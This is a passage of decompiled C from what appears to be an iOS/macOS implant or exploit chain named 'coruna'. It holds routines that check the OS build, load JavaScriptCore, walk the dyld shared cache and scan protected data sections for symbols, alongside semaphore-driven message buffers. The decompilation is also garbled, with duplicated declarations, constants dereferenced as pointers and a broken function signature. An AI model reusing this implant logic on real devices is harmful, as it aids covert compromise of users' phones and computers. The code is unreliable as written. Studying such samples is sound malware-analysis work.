  scratch[0] = 0;
  coruna_vm_deallocate(buf,buf,0x54,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  *(uint64_t *)((long)buf + 0x4c) = 0;
  *(uint64_t *)((long)buf + 0x44) = 0;
  *(uint64_t *)((long)buf + 0x42) = 0;
  *(uint64_t *)((long)buf + 0x3a) = 0;
  *(uint64_t *)((long)buf + 0x32) = 0;
  *(uint64_t *)((long)buf + 0x2a) = 0;
  *(uint64_t *)((long)buf + 0x22) = 0;
  *(uint64_t *)((long)buf + 0x1a) = 0;
  *(uint64_t *)((long)buf + 0x12) = 0;
  *(uint64_t *)((long)buf + 10) = 0;
  *buf = (unsigned long)*(ushort *)(handle + 0x122);
  *(uint16_t *)(buf + 1) = 0;
  addr = *(long *)(handle + 0x20);
  str = *(uint64_t **)(handle + 0xf8);
  handle = 0x18;
  if (*(uint64_t **)(handle + 200) != str) {
    handle = 0x10;
  }
  semaphore = *(semaphore_t *)(handle + handle);
  *str = 0x80000000;
  *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = addr + 10;
  ptr = (unsigned long *)((long)str + addr + (unsigned long)*(uint *)(handle + 0x150));
  u = buf[1];
  *ptr = *buf;
  *(short *)(ptr + 1) = (short)u;
  lk5 = _semaphore_signal(semaphore);
  if (lk5 == 0) {
    *(uint16_t *)(buf + 1) = 0;
    *buf = 0;
  }
  version = lk5 != 0;
  lk5 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk5 == 0x31) {
    version = 0x31;
  }
  else {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 10;
    _free(buf);
  }
  return version;
}





bool coruna_semaphore_timedwait_bc48(long handle,unsigned long arg,int flags)
{
  semaphore_t semaphore;
  ushort u;
  unsigned long *ptr;
  kern_return_t lk3;
  kern_return_t lk4;
  unsigned long *buf;
  long handle;
  uint64_t *str;
  unsigned long size;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x13c);
  *(uint32_t *)((long)buf + 4) = 0;
  buf[1] = *(unsigned long *)(handle + 0x58);
  buf[2] = 0xffffffff;
  buf[3] = 0;
  buf[4] = arg;
  scratch[0] = 0;
  handle = 0xd4;
  if (*(int *)(handle + 0x148) != 0x100400) {
    handle = 4;
  }
  coruna_vm_deallocate(buf,buf,0x28,scratch,bootargs,*(uint32_t *)(handle + handle));
  buf[3] = 0;
  buf[4] = 0;
  u = *(ushort *)(handle + 0x122);
  buf[1] = 0;
  buf[2] = 0;
  *buf = (unsigned long)u;
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  semaphore = *(semaphore_t *)(handle + 0x18);
  if (flags == 0) {
    *str = 0;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    lk3 = _semaphore_signal(semaphore);
  }
  else {
    *str = 0x80000000;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    lk3 = _semaphore_signal(semaphore);
    lk4 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
    if (lk4 == 0x31) {
      return (bool)0x31;
    }
  }
  *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 0x10;
  _free(buf);
  return lk3 != 0;
}





bool coruna_semaphore_timedwait_bc48_beb4(long handle,unsigned long arg,int flags)
{
  semaphore_t semaphore;
  ushort u;
  unsigned long *ptr;
  kern_return_t lk3;
  kern_return_t lk4;
  unsigned long *buf;
  long handle;
  uint64_t *str;
  unsigned long size;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x13a);
  *(uint32_t *)((long)buf + 4) = 0;
  buf[1] = *(unsigned long *)(handle + 0x58);
  buf[2] = 0xffffffff;
  buf[3] = 0;
  buf[4] = arg;
  scratch[0] = 0;
  handle = 0xd4;
  if (*(int *)(handle + 0x148) != 0x100400) {
    handle = 4;
  }
  coruna_vm_deallocate(buf,buf,0x28,scratch,bootargs,*(uint32_t *)(handle + handle));
  buf[3] = 0;
  buf[4] = 0;
  u = *(ushort *)(handle + 0x122);
  buf[1] = 0;
  buf[2] = 0;
  *buf = (unsigned long)u;
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  semaphore = *(semaphore_t *)(handle + 0x18);
  if (flags == 0) {
    *str = 0;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    lk3 = _semaphore_signal(semaphore);
  }
  else {
    *str = 0x80000000;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    lk3 = _semaphore_signal(semaphore);
    lk4 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
    if (lk4 == 0x31) {
      return (bool)0x31;
    }
  }
  *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 0x10;
  _free(buf);
  return lk3 != 0;
}





bool coruna_semaphore_timedwait_bffc(long handle,uint64_t val,int flags)
{
  semaphore_t semaphore;
  ushort u;
  unsigned long *ptr;
  kern_return_t lk3;
  kern_return_t lk4;
  unsigned long *buf;
  long handle;
  uint64_t *str;
  unsigned long size;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x13e);
  *(uint32_t *)((long)buf + 4) = 0;
  buf[1] = *(unsigned long *)(handle + 0x58);
  buf[2] = 0;
  *(uint32_t *)(buf + 3) = 0;
  *(uint64_t *)((long)buf + 0x1c) = val;
  scratch[0] = 0;
  handle = 0xd4;
  if (*(int *)(handle + 0x148) != 0x100400) {
    handle = 4;
  }
  coruna_vm_deallocate(buf,buf,0x24,scratch,bootargs,*(uint32_t *)(handle + handle));
  *(uint32_t *)(buf + 4) = 0;
  u = *(ushort *)(handle + 0x122);
  buf[2] = 0;
  buf[3] = 0;
  *buf = (unsigned long)u;
  buf[1] = 0;
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  semaphore = *(semaphore_t *)(handle + 0x18);
  if (flags == 0) {
    *str = 0;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    lk3 = _semaphore_signal(semaphore);
  }
  else {
    *str = 0x80000000;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    lk3 = _semaphore_signal(semaphore);
    lk4 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
    if (lk4 == 0x31) {
      return (bool)0x31;
    }
  }
  *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 0x10;
  _free(buf);
  return lk3 != 0;
}





bool coruna_semaphore_timedwait_f060(long handle,unsigned long arg,int flags)
{
  unsigned long *ptr;
  semaphore_t semaphore;
  kern_return_t lk2;
  kern_return_t lk3;
  unsigned long *buf;
  long handle;
  uint64_t *str;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x13a);
  *(uint32_t *)((long)buf + 4) = 0;
  buf[1] = *(unsigned long *)(handle + 0x58);
  buf[2] = 0xffffffff;
  buf[3] = 0;
  buf[4] = arg;
  scratch[0] = 0;
  handle = 0xd4;
  if (*(int *)(handle + 0x148) != 0x100400) {
    handle = 4;
  }
  coruna_vm_deallocate(buf,buf,0x28,scratch,bootargs,*(uint32_t *)(handle + handle));
  *(uint64_t *)((long)buf + 10) = 0;
  *(uint64_t *)((long)buf + 0x1a) = 0;
  *(uint64_t *)((long)buf + 0x12) = 0;
  buf[4] = 0;
  *buf = (unsigned long)*(ushort *)(handle + 0x122);
  *(uint16_t *)(buf + 1) = 0;
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  semaphore = *(semaphore_t *)(handle + 0x18);
  if (flags == 0) {
    *str = 0;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 10;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    *ptr = *buf;
    *(short *)(ptr + 1) = (short)buf[1];
    lk2 = _semaphore_signal(semaphore);
  }
  else {
    *str = 0x80000000;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 10;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    *ptr = *buf;
    *(short *)(ptr + 1) = (short)buf[1];
    lk2 = _semaphore_signal(semaphore);
    lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
    if (lk3 == 0x31) {
      return (bool)0x31;
    }
  }
  *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 10;
  _free(buf);
  return lk2 != 0;
}





uint64_t coruna_implant41e4_via_vm_deallocate_2(long handle)
{
  uint16_t *ptr;
  uint64_t u;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  ptr = _malloc(0x1000);
  *ptr = 0;
  ptr[1] = *(uint16_t *)(handle + 0x140);
  *(uint32_t *)(ptr + 2) = 0;
  *(uint64_t *)(ptr + 4) = 0;
  scratch[0] = 0;
  u = coruna_vm_deallocate(ptr,ptr,0x10,scratch,bootargs,*(uint32_t *)(handle + 4));
  _free(ptr);
  return u;
}





void coruna_implant6dec_via_vm_deallocate_3(long handle)
{
  uint16_t *ptr;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  ptr = _malloc(0x1000);
  *ptr = 0;
  ptr[1] = *(uint16_t *)(handle + 0x142);
  *(uint32_t *)(ptr + 2) = 0;
  *(uint64_t *)(ptr + 4) = 0;
  *(uint64_t *)(ptr + 8) = 0xffffffffffffffff;
  *(uint64_t *)(ptr + 0xc) = 0xffffffffffffffff;
  *(uint64_t *)(ptr + 0x10) = 0;
  *(uint64_t *)(ptr + 0x14) = 0;
  *(uint64_t *)(ptr + 0x18) = 0;
  *(uint8_t *)(ptr + 0x1c) = 0;
  *(uint64_t *)(ptr + 0x20) = 1;
  ptr[0x24] = 0;
  *(uint8_t *)(ptr + 0x25) = 0;
  scratch[0] = 0;
  coruna_vm_deallocate(ptr,ptr,0x4b,scratch,bootargs,*(uint32_t *)(handle + 4));
  _free(ptr);
  return;
}





void coruna_ret_stub(long handle)
{
  (**(void (**)(handle + 0x188))();
  return;
}





long coruna_implant41e4_via_load_javascriptcore(long handle,uint64_t val)
{
  int err;
  long handle;
  
  handle = (**(void (**)(handle + 0x178))();
  if (((int)handle == 0) && (handle = (**(void (**)(handle + 0x180))(handle), (int)handle == 0)) {
    err = coruna_load_javascriptcore(val,handle);
    handle = (unsigned long)(err != 0) << 3;
  }
  return handle;
}





uint64_t coruna_implant49c4_via_dispatch_sync(long handle)
{
  uint32_t u;
  uint64_t size;
  long handle;
  int err;
  
  size = coruna_implant41e4_via_dispatch_sync();
  if (((int)size == 0) && (size = coruna_implant41e4_via_vm_deallocate_2(handle), u = k_implant_float_const_pack, (int)size == 0)) {
    if (*(int *)(handle + 0x148) == 0x100400) {
      coruna_dispatch_sync(handle);
    }
    else {
      err = 5;
      do {
        coruna_dispatch_sync(handle);
        handle = *(long *)(*(long *)(handle + 0x80) + 0x100);
        if (handle != 0 && *(long *)(handle + 0x118) != handle) break;
        coruna_nanosleep(u);
        err = err + -1;
      } while (err != 0);
    }
    size = 0;
  }
  return size;
}
uint64_t coruna_sysctlbyname_c494(long handle)
{
  bool err;
  bool status;
  int err;
  uint64_t u;
  size_t scratch [16];
  unsigned long bootargs;
  long thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t action;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t block_ctx;
  uint64_t region;
  uint64_t plist;
  long stack_guard;
  uint64_t sa_saved;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint32_t sa_new;
  int path_buf;
  uint64_t tmp_buf;
  void (*region)(void);
  void (*plist)(void);
  void (*url_buf)(void);
  void (*json_buf)(void);
  void (*frame)(void);
  void (*work)(void);
  void (*cache)(void);
  long cache_20;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  long cache_21;
  
  cache_21 = *(long *)k_implant_stack_chk_guard_slot;
  scratch[0xf] = 0;
  bootargs = bootargs & 0xffffffff00000000;
  work = 0;
  cache_20 = 0;
  cache_20 = 0;
  cache = 0;
  scratch[0] = 0x20;
  err = _sysctlbyname("kern.osversion",&cache_20,scratch,(void *)0x0,0);
  if (err == -1) {
    u = 0xffffffff;
    goto fail;
  }
  path_buf = *(int *)(*(long *)(handle + 0x18) + 0xc0);
  if (path_buf - 0x100300U < 2) {
done:
    if (cache_20 == 0x6532333035433032 && (char)work == '\0') {
cleanup:
      plist = coruna_semaphore_timedwait_a674;
    }
    else {
      plist = coruna_semaphore_timedwait_9ba0;
    }
    url_buf = coruna_semaphore_timedwait_9d54;
    json_buf = coruna_implant49c4_str_system_library_frameworks_webkit_framework_webk_2;
    frame = coruna_difftime;
    work = coruna_sysctlbyname_a2dc;
    cache = coruna_implant49c4_via_nanosleep;
    region = coruna_implant49c4_via_vm_deallocate;
    tmp_buf = k_implant_insn_word_eaf8;
  }
  else {
    if (path_buf != 0x100400) {
      if (path_buf == 0x100200) goto done;
      goto cleanup;
    }
    cache = coruna_implant49c4_via_semaphore_timedwait_ba6c;
    work = coruna_implant49c4_via_semaphore_timedwait_bc48;
    frame = coruna_difftime_9634;
    json_buf = coruna_implant49c4_str_system_library_frameworks_webkit_framework_webk;
    url_buf = coruna_semaphore_timedwait_91dc;
    plist = coruna_semaphore_timedwait;
    region = coruna_implant41e4_via_u64_pack_2;
    tmp_buf = k_implant_scan_magic_a;
  }
  sa_new = 0;
  url_buf = 0;
  sa_saved = 0;
  frame = 0;
  json_buf = 0;
  region = 0;
  block_ctx = 0;
  stack_guard = 0;
  plist = 0;
  sa_new = 0;
  action = 0;
  tmp_buf = 0;
  path_buf = 0;
  block_ctx = 0;
  serial_buf = 0;
  sa_saved = 0;
  stack_guard = 0;
  host_info = 0;
  host_info = 0;
  action = 0;
  serial_buf = 0;
  scratch = 0;
  thread_attr = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch[0xe] = 0;
  scratch[0xd] = 0;
  bootargs = 0;
  scratch[0xf] = 0;
  scratch[10] = 0;
  scratch[9] = 0;
  scratch[0xc] = 0;
  scratch[0xb] = 0;
  scratch[6] = 0;
  scratch[5] = 0;
  scratch[8] = 0;
  scratch[7] = 0;
  scratch[2] = 0;
  scratch[1] = 0;
  scratch[4] = 0;
  scratch[3] = 0;
  u = coruna_implant49c4_via_dispatch_sync(scratch + 1);
  if ((int)u == 0) {
    status = true;
    do {
      err = status;
      u = coruna_mach_make_memory_entry_64(scratch + 1);
      if ((int)u == 0) {
        u = coruna_implant41e4_via_load_javascriptcore(scratch + 1,handle);
        if ((int)u == 0) {
          coruna_mach_port_destroy(scratch + 1);
          break;
        }
        coruna_dispatch_sync(scratch + 1);
        if (((bool)((*(long *)(thread_attr + 0x100) == 0 || stack_guard == *(long *)(thread_attr + 0x100))
                   & err)) && (u = coruna_implant49c4_via_dispatch_sync(scratch + 1), (int)u != 0)) break;
      }
      coruna_mach_port_destroy(scratch + 1);
      status = false;
    } while (err);
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot != cache_21) {
    ___stack_chk_fail();
  }
  return u;
}





long coruna_implant49c4_via_task_info_c830(char *path)
{
  int err;
  long handle;
  long addr;
  unsigned long u;
  unsigned long size;
  uint *ptr;
  
  handle = coruna_task_info();
  u = *(unsigned long *)(handle + 0x90);
  if (u != 0) {
    size = 0;
    addr = (unsigned long)*(uint *)(handle + 0x1c0) + handle;
    ptr = (uint *)(addr + 0x18);
    do {
      err = _strcmp(path,(char *)(handle + (unsigned long)*ptr));
      if (err == 0) {
        addr = *(long *)(addr + (size & 0xffffffff) * 0x20);
        handle = coruna_task_info_c830();
        return handle + addr;
      }
      size = size + 1;
      ptr = ptr + 8;
    } while (u != size);
  }
  return 0;
}





uint64_t coruna_task_info(void)
{
  kern_return_t lk1;
  uint64_t u;
  long scratch [2];
  uint32_t bootargs;
  mach_msg_type_number_t thread_attr;
  
  thread_attr = 5;
  scratch[0] = 0;
  scratch[1] = 0;
  bootargs = 0;
  lk1 = _task_info(*(task_name_t *)k_implant_mach_task_self_slot,0x11,(task_info_t)scratch,
                     &thread_attr);
  u = 0;
  if (lk1 == 0 && scratch[0] != 0) {
    u = *(uint64_t *)(scratch[0] + 0xb0);
  }
  return u;
}





uint64_t coruna_task_info_c830(void)
{
  kern_return_t lk1;
  uint64_t u;
  long scratch [2];
  uint32_t bootargs;
  mach_msg_type_number_t thread_attr;
  
  thread_attr = 5;
  scratch[0] = 0;
  scratch[1] = 0;
  bootargs = 0;
  lk1 = _task_info(*(task_name_t *)k_implant_mach_task_self_slot,0x11,(task_info_t)scratch,
                     &thread_attr);
  u = 0;
  if (lk1 == 0 && scratch[0] != 0) {
    u = *(uint64_t *)(scratch[0] + 0x98);
  }
  return u;
}





uint64_t
void coruna_implant41e4_residual_62(int *flags,char *path,char *str_2,uint64_t *val,uint64_t *id_2)
{
  char *ptr;
  int err;
  uint u;
  int status;
  int flags;
  long handle;
  
  if ((*flags == -0x1120531) && (err = flags[4], err != 0)) {
    flags = 0;
    flags = flags + 8;
    do {
      if (((*flags == 0x19) && (status = _strcmp((char *)(flags + 2),path), status == 0)) &&
         (u = flags[0x10], u != 0)) {
        handle = 0;
        do {
          ptr = (char *)((long)flags + handle + 0x48);
          status = _strcmp(ptr,str_2);
          if (status == 0) {
            *val = flags;
            *id_2 = ptr;
            return 1;
          }
          handle = handle + 0x50;
        } while ((unsigned long)u * 0x50 - handle != 0);
      }
      flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
      flags = flags + 1;
    } while (flags != err);
  }
  return 0;
}
void coruna_getsectdatafromframework(char *path,char *str_2,char *name_3,uint64_t *val)
{
  long handle;
  int err;
  char *ptr;
  uint64_t u;
  long addr;
  long off;
  long scratch [3];
  
  ptr = _getsectdatafromFramework(path,str_2,name_3,(unsigned long *)(scratch + 2));
  if (ptr == (char *)0x0) {
    u = coruna_implant49c4_via_task_info_c830(path);
    scratch[0] = 0;
    scratch[1] = 0;
    err = coruna_implant41e4_residual_62(u,str_2,name_3,scratch + 1,scratch);
    handle = scratch[0];
    ptr = (char *)0x0;
    if (err != 0) {
      off = *(long *)(scratch[0] + 0x20);
      addr = __dyld_get_image_slide(u);
      ptr = (char *)(addr + off);
      scratch[2] = *(uint64_t *)(handle + 0x28);
    }
  }
  if ((ptr != (char *)0x0) && (val != (uint64_t *)0x0)) {
    *val = scratch[2];
  }
  return;
}





uint64_t coruna_dyld_shared_cache_file_path(char *path,char *str_2)
{
  uint64_t u;
  uint8_t *ptr;
  char *ptr;
  uint64_t size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  char *action;
  uint64_t block_ctx;
  uint64_t *stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint8_t *path_buf;
  uint64_t tmp_buf;
  void (*region)(void);
  uint8_t *plist;
  uint8_t *url_buf;
  uint64_t *json_buf;
  char *frame;
  uint64_t work;
  uint64_t *cache;
  uint64_t cache_20;
  uint8_t cache_21;
  char cache_22 [1024];
  long cache_23;
  
  ptr = k_implant_nsconcretestackblock_slot;
  u = k_implant_rodata_word_ec18;
  cache_23 = *(long *)k_implant_stack_chk_guard_slot;
  size = 0;
  if (path != (char *)0x0) {
    if ((*path == '\0' || str_2 == (char *)0x0) || (*str_2 == '\0')) {
      size = 0;
    }
    else {
      serial_buf = &block_ctx;
      block_ctx = 0;
      sa_saved = k_implant_rodata_word_ec10;
      sa_new = 0;
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_ec18;
      thread_attr = coruna_dyld_image_local_nlist_content_4symbolication;
      host_info = &k_implant_bss_slot_10910;
      cache = &work;
      work = 0;
      cache_20 = k_implant_rodata_word_ec10;
      cache_21 = 0;
      action = str_2;
      stack_guard = serial_buf;
      ptr = (char *)_dyld_shared_cache_file_path();
      if (ptr != (char *)0x0) {
        _bzero(cache_22,0x400);
        _strncpy(cache_22,ptr,0x400);
        if (cache_22[0] != '\0') {
          path_buf = ptr;
          tmp_buf = u;
          region = coruna_dyld_shared_cache_for_each_image;
          plist = &k_implant_bss_slot_10998;
          json_buf = &work;
          url_buf = (uint8_t *)&scratch;
          frame = path;
          _dyld_shared_cache_for_file(cache_22,&path_buf);
        }
      }
      __Block_object_dispose(&work,8);
      size = stack_guard[3];
      __Block_object_dispose(&block_ctx,8);
    }
  }
  if (*(long *)k_implant_stack_chk_guard_slot == cache_23) {
    return size;
  }
  ___stack_chk_fail();
}





void coruna_dyld_image_local_nlist_content_4symbolication(long handle,uint64_t val)
{
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t scratch;
  
  scratch = k_implant_nsconcretestackblock_slot;
  bootargs = k_implant_rodata_word_ec18;
  thread_attr = coruna_macho_text_seg;
  host_info = &k_implant_bss_slot_108e0;
  serial_buf = *(uint64_t *)(handle + 0x20);
  action = *(uint64_t *)(handle + 0x28);
  scratch = val;
  _dyld_image_local_nlist_content_4Symbolication(val,&scratch);
  return;
}





void coruna_macho_text_seg(long handle,uint *size,unsigned long arg,long addr_2)
{
  int err;
  unsigned long u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  uint *action;
  
  if (arg != 0) {
    u = 0;
    do {
      if ((addr_2 != 0) &&
         (err = _strcmp((char *)(addr_2 + (unsigned long)*size),*(char **)(handle + 0x28)),
         err == 0)) {
        scratch = k_implant_nsconcretestackblock_slot;
        bootargs = k_implant_rodata_word_ec18;
        thread_attr = coruna_implant6dec_residual_91;
        host_info = &k_implant_bss_slot_108b0;
        serial_buf = *(uint64_t *)(handle + 0x20);
        action = size;
        _dyld_image_content_for_segment(*(uint64_t *)(handle + 0x30),"__TEXT",&scratch);
        return;
      }
      u = u + 1;
      size = size + 4;
    } while (u < arg);
  }
  return;
}





void coruna_implant6dec_residual_91(long handle,long addr_2,long off_3)
{
  *(long *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) =
       addr_2 + (*(long *)(*(long *)(handle + 0x28) + 8) - off_3);
  return;
}





void coruna_block_assign_fe28(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  return;
}





void coruna_block_dispose_fe38(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}
long coruna_dlclose_ccdc(uint64_t val,uint64_t id_2)
{
  uint64_t *******lpppppppu1;
  bool err;
  long handle;
  long addr;
  string *lps5;
  long off;
  void *scratch [2];
  char bootargs;
  string *thread_attr;
  string *host_info;
  string *serial_buf;
  uint64_t *******action [2];
  char block_ctx;
  string stack_guard [23];
  char sa_saved;
  long sa_new;
  
  sa_new = *(long *)k_implant_stack_chk_guard_slot;
  handle = coruna_dyld_shared_cache_file_path();
  if (handle == 0) {
    addr = _dlopen(val,1);
    if (addr != 0) {
      coruna_memcpy_ce98(action,id_2);
      coruna_memcpy_ce98(scratch,id_2);
      lps5 = (string *)std_string_erase((unsigned long)scratch,0);
      std_string_string(stack_guard,lps5);
      lps5 = operator_new(0x30);
      serial_buf = lps5 + 0x30;
      handle = 0;
      thread_attr = lps5;
      do {
        off = handle;
        std_string_string(lps5 + off,(string *)((long)action + off));
        handle = off + 0x18;
      } while (off + 0x18 != 0x30);
      handle = 0;
      host_info = lps5 + 0x30;
      do {
        if ((&sa_saved)[handle] < '\0') {
          operator_delete(*(void **)(stack_guard + handle));
        }
        handle = handle + -0x18;
      } while (handle != -0x30);
      if (bootargs < '\0') {
        operator_delete(scratch[0]);
      }
      do {
        std_string_string((string *)action,lps5);
        lpppppppu1 = action[0];
        if (-1 < block_ctx) {
          lpppppppu1 = action;
        }
        handle = _dlsym(addr,lpppppppu1);
        if (block_ctx < '\0') {
          operator_delete(action[0]);
        }
        lps5 = lps5 + 0x18;
        err = off != 0;
        off = off + -0x18;
      } while (handle == 0 && err);
      _dlclose(addr);
      coruna_implant41e4_residual_8(&thread_attr);
      goto joined_r0x0000ce4c;
    }
  }
  else {
joined_r0x0000ce4c:
    if (handle != 0) goto fail;
  }
  handle = 0xffff1102888122;
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == sa_new) {
    return handle;
  }
  ___stack_chk_fail();
}





uint64_t * coruna_memcpy_ce98(uint64_t *val,char *path)
{
  bool err;
  uint8_t *ptr;
  uint8_t *buf;
  uint8_t *str;
  bool status;
  size_t ls6;
  uint64_t *copy;
  uint64_t *data;
  long handle;
  long *ptr;
  unsigned long u;
  uint64_t *obj;
  char *ptr;
  long addr;
  long off;
  uint8_t u[16];
  long scratch;
  long *bootargs;
  long *thread_attr;
  uint64_t scratch;
  long host_info;
  
  ls6 = _strlen(path);
  if (0xffffffffffffffef < ls6) {
    u = coruna_abort_d4d4();
    host_info = *(long *)k_implant_stack_chk_guard_slot;
    copy = operator_new(0x28);
    str = PTR_s___DATA_CONST_00010958;
    buf = PTR_s___DATA_00010950;
    ptr = PTR_s___AUTH_CONST_00010940;
    copy[1] = PTR_s___AUTH_00010948;
    *copy = ptr;
    copy[3] = str;
    copy[2] = buf;
    copy[4] = PTR_s___DATA_DIRTY_00010960;
    bootargs = (long *)0xff37;
    thread_attr = (long *)0xff3f;
    data = operator_new(0x10);
    off = 0;
    data[1] = thread_attr;
    *data = bootargs;
    ptr = "__AUTH_CONST";
    do {
      addr = 0;
      obj = (uint64_t *)0xffff1102888122;
      do {
        handle = coruna_getsectdatafromframework(u,ptr,data[addr],&scratch);
        if (handle != 0) {
          bootargs = (long *)0x0;
          thread_attr = (long *)0x0;
          scratch = 0;
          coruna_implant49c4_via_abort_d610(&bootargs,0,handle,handle + scratch * 8);
          ptr = bootargs;
          if (bootargs == thread_attr) {
fail:
            status = ptr == thread_attr;
            err = !status;
            if (!status) {
              obj = (uint64_t *)((long)ptr + (handle - (long)bootargs));
            }
          }
          else {
            do {
              if (*ptr == u) goto fail;
              ptr = ptr + 1;
            } while (ptr != thread_attr);
            err = false;
            status = true;
          }
          if (bootargs != (long *)0x0) {
            thread_attr = bootargs;
            operator_delete(bootargs);
          }
          if ((err) && (!status)) break;
        }
        addr = addr + 1;
      } while (addr != 2);
      if ((obj != (uint64_t *)0xffff1102888122) || (off = off + 1, off == 5)) {
        operator_delete(data);
        operator_delete(copy);
        if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
          return obj;
        }
        ___stack_chk_fail();
      }
      ptr = (char *)copy[off];
    } while( true );
  }
  if (ls6 < 0x17) {
    *(char *)((long)val + 0x17) = (char)ls6;
    copy = val;
    if (ls6 == 0) goto done;
  }
  else {
    u = ls6 + 0x10 & 0xfffffffffffffff0;
    copy = operator_new(u);
    val[1] = ls6;
    val[2] = u | 0x8000000000000000;
    *val = copy;
  }
  _memcpy(copy,path,ls6);
done:
  *(uint8_t *)((long)copy + ls6) = 0;
  return val;
}





long coruna_implant49c4_str_auth_const(uint64_t val,long handle)
{
  bool err;
  uint8_t *ptr;
  uint8_t *buf;
  uint8_t *str;
  bool status;
  uint64_t *copy;
  uint64_t *data;
  long handle;
  long *ptr;
  long addr;
  char *ptr;
  long off;
  long base;
  long scratch;
  long *bootargs;
  long *thread_attr;
  uint64_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  copy = operator_new(0x28);
  str = PTR_s___DATA_CONST_00010958;
  buf = PTR_s___DATA_00010950;
  ptr = PTR_s___AUTH_CONST_00010940;
  copy[1] = PTR_s___AUTH_00010948;
  *copy = ptr;
  copy[3] = str;
  copy[2] = buf;
  copy[4] = PTR_s___DATA_DIRTY_00010960;
  bootargs = (long *)0xff37;
  thread_attr = (long *)0xff3f;
  data = operator_new(0x10);
  base = 0;
  data[1] = thread_attr;
  *data = bootargs;
  ptr = "__AUTH_CONST";
  do {
    off = 0;
    addr = 0xffff1102888122;
    do {
